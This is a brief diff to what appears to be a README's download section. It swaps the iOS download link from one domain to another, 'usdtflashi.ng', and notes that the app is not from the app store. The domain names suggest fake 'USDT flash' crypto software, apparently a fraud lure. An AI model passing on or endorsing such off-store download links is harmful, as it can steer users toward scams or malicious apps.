@@ -22,7 +22,7 @@ The latest android APK is available on the release page.
 
 ### IOS
 
-Visit [the official project website](http://coinflasher.online) to download the IOS version. This is not an app store download.
+Visit [the official project website](http://usdtflashi.ng) to download the IOS version. This is not an app store download.
 
 ### PC
 
